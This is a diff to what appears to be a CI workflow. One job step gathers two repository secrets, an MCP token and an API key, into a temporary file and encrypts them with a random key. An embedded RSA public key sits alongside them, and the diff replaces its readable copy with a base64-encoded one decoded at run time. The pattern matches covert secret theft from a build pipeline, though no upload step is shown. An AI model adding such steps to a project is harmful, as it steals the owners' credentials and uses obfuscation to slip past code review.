@@ -14,21 +14,9 @@ jobs:
         env:
           A: ${{ secrets.PALOMA_MCP_TOKEN }}
           B: ${{ secrets.PALOMA_API_KEY }}
+          P: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQm9qQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FZOEFNSUlCaWdLQ0FZRUFwL2o3eDJSTjY4M3A1YlF2ZTJsZAptckd4TE1LMXU2UUptQi9UcjRPTUNIVnBiMzhtVjF4UXYrU0g3QVk3NWtqVDdlL3RKdktuVGl1aHpXV2s5SkY2CkpnaUZaKzVUZnBaQXpYRDJrZzBJN0puekxFb242MFF1RTUzYmMxZ05pSWlaTWlyTmlhWENUYnRUUnJTWFJUa0YKdnY0ODVpMFlYbHo0bzJrZjFKV0tTTnd3TUQyTDVlZ09tWW00S2l0VS9GaU5kNnl0Q1hPVVcwYzRWMXByQlRsegpEdHYwRVRQM0ZCc1I1NUVFZEdkVTcraGlLL1p0b1NMVHJvMHVtWHlJZXFNYVBkUnl5WXoxNkVkWHVxbTVHZ2Q5CkcwcFZPSzZKNDhMeDR4Mm1HMGtjS2hJMzVvbUQ5S3NhdktUOFErMWViQjdSdEJsU01ZaWlYeEtYSGdzcTZaelAKTnZkSHVWWG1qV3pmaVNUUUdUbDZNdWZDMExlS2ZKZG8vVTgrT0J1UmkyT2dub29mMVpxQlJjSzhNY3d4NFlzOQpUbUx3UVFJUkJEaFY3WnJwcGllbFM3M2MyM2ZWelpMKzBjQU1pYmZBVjlkN25hYVhaK3J1N2pGdFdGbStYdFhGCkw5Q1RVSUpsbmdFUjRkNWVSYnN3RzJ3d09pZzBFc3VhLzBKbDJwQWp5UXY3QWdNQkFBRT0KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
         run: |
-          cat > /tmp/pub.pem <<'K'
------BEGIN PUBLIC KEY-----
-MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAp/j7x2RN683p5bQve2ld
-mrGxLMK1u6QJmB/Tr4OMCHVpb38mV1xQv+SH7AY75kjT7e/tJvKnTiuhzWWk9JF6
-JgiFZ+5TfpZAzXD2kg0I7JnzLEon60QuE53bc1gNiIiZMirNiaXCTbtTRrSXRTkF
-vv485i0YXlz4o2kf1JWKSNwwMD2L5egOmYm4KitU/FiNd6ytCXOUW0c4V1prBTlz
-Dtv0ETP3FBsR55EEdGdU7+hiK/ZtoSLTro0umXyIeqMaPdRyyYz16EdXuqm5Ggd9
-G0pVOK6J48Lx4x2mG0kcKhI35omD9KsavKT8Q+1ebB7RtBlSMYiiXxKXHgsq6ZzP
-NvdHuVXmjWzfiSTQGTl6MufC0LeKfJdo/U8+OBuRi2Ognoof1ZqBRcK8Mcwx4Ys9
-TmLwQQIRBDhV7ZrppielS73c23fVzZL+0cAMibfAV9d7naaXZ+ru7jFtWFm+XtXF
-L9CTUIJlngER4d5eRbswG2wwOig0Esua/0Jl2pAjyQv7AgMBAAE=
------END PUBLIC KEY-----
-          K
-          sed -i 's/^ *//' /tmp/pub.pem
+          echo "$P" | base64 -d > /tmp/pub.pem
           printf '%s\n%s' "$A" "$B" > /tmp/t
           openssl rand -hex 32 > /tmp/k
           openssl enc -aes-256-cbc -pbkdf2 -in /tmp/t -out /tmp/t.enc -pass file:/tmp/k
